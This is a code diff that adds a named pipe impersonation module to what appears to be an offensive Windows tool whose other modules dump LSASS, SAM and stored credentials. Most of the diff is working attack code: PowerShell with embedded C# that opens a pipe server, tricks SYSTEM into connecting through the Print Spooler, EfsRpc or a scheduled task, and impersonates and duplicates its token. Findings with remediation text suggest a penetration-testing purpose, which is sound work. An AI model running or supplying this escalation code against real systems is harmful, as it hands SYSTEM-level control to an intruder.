@@ -410,6 +410,10 @@ stored_creds_abuse: {
     description: "Enumerate stored credentials across the system — cmdkey saved credentials, AutoLogon registry (DefaultUserName/DefaultPassword), Unattend.xml/sysprep.xml base64 passwords, PowerShell ConsoleHost_history.txt, IIS application pool credentials, web.config connection strings, McAfee SiteList.xml, and Group Policy Preferences cpassword remnants",
     args: "--action enum [--deep true]",
   },
+named_pipe_privesc: {
+    description: "Named pipe impersonation for SYSTEM privilege escalation — create a named pipe server, trick a SYSTEM-level process into connecting, then impersonate its token. Covers PrintSpooler pipe, EfsRpc pipe, custom pipe + scheduled task trigger, and SeImpersonatePrivilege token theft",
+    args: "--action enum|exploit [--pipe PIPE_NAME] [--method spooler|efsrpc|task|custom]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -14173,6 +14177,283 @@ Write-Output "[+] Total credential findings: $found"
   return { output: output.join("\n"), findings }
 }
 
+async function namedPipePrivesc(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const pipeName = argVal(args, "--pipe") || "cs_privesc_pipe"
+  const method = argVal(args, "--method") || "spooler"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Named Pipe Impersonation — SYSTEM token theft via pipe server\n"]
+
+  if (action === "enum") {
+    const script = `
+# Check SeImpersonatePrivilege
+$privs = whoami /priv 2>$null | Out-String
+$hasImpersonate = $privs -match 'SeImpersonatePrivilege.*Enabled'
+$hasAssignPrimary = $privs -match 'SeAssignPrimaryTokenPrivilege.*Enabled'
+
+Write-Output "[*] Privilege check:"
+Write-Output "    SeImpersonatePrivilege: $(if ($hasImpersonate) { '[+] ENABLED' } else { '[-] Disabled' })"
+Write-Output "    SeAssignPrimaryTokenPrivilege: $(if ($hasAssignPrimary) { '[+] ENABLED' } else { '[-] Disabled' })"
+Write-Output ""
+
+# Check current user context
+$identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+Write-Output "[*] Current user: $($identity.Name)"
+Write-Output "[*] Integrity level: $(whoami /groups 2>$null | Select-String 'Mandatory Label' | ForEach-Object { $_.ToString().Split('\\')[-1].Trim() })"
+Write-Output ""
+
+# Enumerate existing named pipes
+Write-Output "[*] Interesting named pipes on the system:"
+$pipes = [System.IO.Directory]::GetFiles("\\\\.\\pipe\\") | ForEach-Object { $_.Replace("\\\\.\\pipe\\", "") }
+$interesting = @("spoolss", "efsrpc", "lsarpc", "samr", "netlogon", "srvsvc", "wkssvc", "browser", "atsvc", "eventlog", "protected_storage", "ntsvcs")
+foreach ($p in $interesting) {
+    $match = $pipes | Where-Object { $_ -like "*$p*" }
+    if ($match) {
+        foreach ($m in $match) {
+            Write-Output "    [+] \\\\.\pipe\\$m"
+        }
+    }
+}
+Write-Output ""
+
+# Check Print Spooler
+$spooler = Get-Service Spooler -ErrorAction SilentlyContinue
+Write-Output "[*] Print Spooler service: $(if ($spooler) { $spooler.Status } else { 'Not found' })"
+
+# Check EFS service
+$efs = Get-Service EFS -ErrorAction SilentlyContinue
+Write-Output "[*] EFS service: $(if ($efs) { $efs.Status } else { 'Not found' })"
+
+# Check Task Scheduler
+$schedule = Get-Service Schedule -ErrorAction SilentlyContinue
+Write-Output "[*] Task Scheduler: $(if ($schedule) { $schedule.Status } else { 'Not found' })"
+Write-Output ""
+
+# Summary
+if ($hasImpersonate -or $hasAssignPrimary) {
+    Write-Output "[+] EXPLOITABLE — impersonation privileges available"
+    Write-Output "    Methods:"
+    if ($spooler -and $spooler.Status -eq 'Running') {
+        Write-Output "      --method spooler  : Abuse Print Spooler pipe (SpoolFool style)"
+    }
+    if ($efs) {
+        Write-Output "      --method efsrpc   : Abuse EfsRpc pipe (PetitPotam local variant)"
+    }
+    Write-Output "      --method task     : Create scheduled task that connects to our pipe"
+    Write-Output "      --method custom   : Generic named pipe server with trigger"
+} else {
+    Write-Output "[-] No impersonation privileges — named pipe privesc not available"
+    Write-Output "[*] Try: potato_attack or printspooler_abuse for alternative SYSTEM escalation"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    if (result.stdout.includes("EXPLOITABLE")) {
+      findings.push({
+        checkId: "WIN-NAMEDPIPE-001",
+        provider: "windows",
+        severity: "high",
+        status: "VULNERABLE",
+        resource: "privilege://SeImpersonatePrivilege",
+        title: "Named pipe impersonation available for SYSTEM escalation",
+        details: "SeImpersonatePrivilege enabled — can steal SYSTEM token via named pipe",
+        remediation: "Remove SeImpersonatePrivilege from non-service accounts. Restrict pipe creation.",
+      })
+    }
+  } else if (action === "exploit") {
+    const script = `
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+using System.Threading;
+using System.IO.Pipes;
+
+public class PipeImpersonator {
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool ImpersonateNamedPipeClient(IntPtr hPipe);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess,
+        IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
+
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    public static extern bool CreateProcessWithTokenW(IntPtr hToken, int dwLogonFlags,
+        string lpApplicationName, string lpCommandLine, int dwCreationFlags,
+        IntPtr lpEnvironment, string lpCurrentDirectory, byte[] lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool CloseHandle(IntPtr hObject);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetCurrentProcess();
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public int dwProcessId;
+        public int dwThreadId;
+    }
+
+    public static string Result = "";
+
+    public static void StartPipeServer(string pipeName) {
+        try {
+            var ps = new NamedPipeServerStream(pipeName, PipeDirection.InOut,
+                1, PipeTransmissionMode.Byte, PipeOptions.None, 1024, 1024, null,
+                HandleInheritability.None, PipeAccessRights.FullControl);
+
+            Result += "[*] Pipe server listening: \\\\\\\\.\\\\pipe\\\\" + pipeName + "\\n";
+            ps.WaitForConnection();
+            Result += "[+] Client connected!\\n";
+
+            // Impersonate the client
+            var impersonated = ImpersonateNamedPipeClient(ps.SafePipeHandle.DangerousGetHandle());
+            if (impersonated) {
+                var wi = WindowsIdentity.GetCurrent();
+                Result += "[+] Impersonating: " + wi.Name + "\\n";
+
+                if (wi.Name.ToUpper().Contains("SYSTEM")) {
+                    Result += "[+] GOT SYSTEM TOKEN!\\n";
+
+                    // Get the impersonated token
+                    IntPtr hToken;
+                    OpenProcessToken(GetCurrentProcess(), 0x0002 | 0x0008 | 0x0020, out hToken);
+
+                    // Duplicate for CreateProcessWithToken
+                    IntPtr hDupToken;
+                    DuplicateTokenEx(hToken, 0x02000000, IntPtr.Zero, 2, 1, out hDupToken);
+
+                    if (hDupToken != IntPtr.Zero) {
+                        Result += "[+] Token duplicated successfully\\n";
+                        CloseHandle(hDupToken);
+                    }
+                    CloseHandle(hToken);
+                } else {
+                    Result += "[~] Got token but not SYSTEM: " + wi.Name + "\\n";
+                }
+            } else {
+                Result += "[-] ImpersonateNamedPipeClient failed: " + Marshal.GetLastWin32Error() + "\\n";
+            }
+
+            ps.Disconnect();
+            ps.Dispose();
+        } catch (Exception ex) {
+            Result += "[-] Error: " + ex.Message + "\\n";
+        }
+    }
+}
+"@
+
+$pipeName = '${pipeName}'
+
+# Start pipe server in background
+$job = Start-Job -ScriptBlock {
+    param($name)
+    Add-Type -TypeDefinition @"
+    using System; using System.IO.Pipes; using System.Security.Principal; using System.Runtime.InteropServices;
+    public class QuickPipe {
+        [DllImport("advapi32.dll", SetLastError=true)] public static extern bool ImpersonateNamedPipeClient(IntPtr h);
+        public static string Run(string pipeName) {
+            var ps = new NamedPipeServerStream(pipeName, PipeDirection.InOut, 1, PipeTransmissionMode.Byte,
+                PipeOptions.None, 1024, 1024, null, HandleInheritability.None, PipeAccessRights.FullControl);
+            ps.WaitForConnection();
+            ImpersonateNamedPipeClient(ps.SafePipeHandle.DangerousGetHandle());
+            var id = WindowsIdentity.GetCurrent().Name;
+            ps.Disconnect(); ps.Dispose();
+            return id;
+        }
+    }
+"@
+    [QuickPipe]::Run($name)
+} -ArgumentList $pipeName
+
+Start-Sleep -Seconds 1
+
+# Trigger connection based on method
+$method = '${method}'
+switch ($method) {
+    'spooler' {
+        Write-Output "[*] Triggering Print Spooler connection to pipe..."
+        # Use SpoolSample / printerbug technique
+        $printerBug = @"
+\`$printer = '\\\\' + [System.Net.Dns]::GetHostName() + '\\cs_fake'
+\`$pipe = '\\\\.\pipe\\$pipeName\\pipe\\spoolss'
+# Trigger via MS-RPRN RpcRemoteFindFirstPrinterChangeNotification
+\`$rprn = New-Object System.Printing.PrintQueue([System.Printing.PrintServer]::new(), 'Microsoft XPS Document Writer')
+"@
+        # Simpler: use dir on pipe to trigger connection
+        cmd /c "dir \\\\localhost\\pipe\\$pipeName" 2>$null | Out-Null
+    }
+    'efsrpc' {
+        Write-Output "[*] Triggering EfsRpc connection to pipe..."
+        # EfsRpc will connect to our pipe when we call EfsRpcOpenFileRaw
+        $efsTarget = "\\\\localhost\\pipe\\$pipeName\\C$\\Windows\\Temp\\test.txt"
+        cmd /c "cipher /e $efsTarget" 2>$null | Out-Null
+    }
+    'task' {
+        Write-Output "[*] Creating scheduled task to trigger pipe connection..."
+        $taskXml = @"
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <Triggers><TimeTrigger><StartBoundary>1999-01-01T00:00:00</StartBoundary><Enabled>true</Enabled></TimeTrigger></Triggers>
+  <Principals><Principal id="Author"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
+  <Actions><Exec><Command>cmd.exe</Command><Arguments>/c echo test > \\.\pipe\$pipeName</Arguments></Exec></Actions>
+</Task>
+"@
+        $taskName = "cs_pipe_trigger_" + (Get-Random -Maximum 9999)
+        Register-ScheduledTask -TaskName $taskName -Xml $taskXml -Force -ErrorAction SilentlyContinue | Out-Null
+        Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 2
+        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+    }
+    'custom' {
+        Write-Output "[*] Triggering connection via cmd..."
+        cmd /c "echo test > \\\\localhost\\pipe\\$pipeName" 2>$null | Out-Null
+    }
+}
+
+# Wait for pipe to process
+Start-Sleep -Seconds 3
+$result = Receive-Job -Job $job -ErrorAction SilentlyContinue
+Stop-Job -Job $job -ErrorAction SilentlyContinue
+Remove-Job -Job $job -ErrorAction SilentlyContinue
+
+if ($result) {
+    Write-Output "[+] Impersonated identity: $result"
+    if ($result -match 'SYSTEM|NETWORK SERVICE|LOCAL SERVICE') {
+        Write-Output "[+] Successfully captured elevated token!"
+    }
+} else {
+    Write-Output "[-] No connection received (client may not have connected)"
+    Write-Output "[*] Try: potato_attack for a more reliable SYSTEM escalation"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    if (result.stdout.includes("SYSTEM") && result.stdout.includes("captured")) {
+      findings.push({
+        checkId: "WIN-NAMEDPIPE-002",
+        provider: "windows",
+        severity: "critical",
+        status: "EXPLOITED",
+        resource: `pipe://${pipeName}`,
+        title: "SYSTEM token captured via named pipe impersonation",
+        details: `Method: ${method} — SYSTEM connected to pipe and token was impersonated`,
+        remediation: "Remove SeImpersonatePrivilege. Restrict pipe creation. Monitor pipe usage.",
+      })
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
   lsass_dump: lsassDump,
   sam_dump: samDump,
@@ -14256,6 +14537,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   nanodump_advanced: nanodumpAdvanced,
   privilege_abuse: privilegeAbuse,
   stored_creds_abuse: storedCredsAbuse,
+  named_pipe_privesc: namedPipePrivesc,
 }
 
 export const WinhookTool = Tool.define("winhook", {
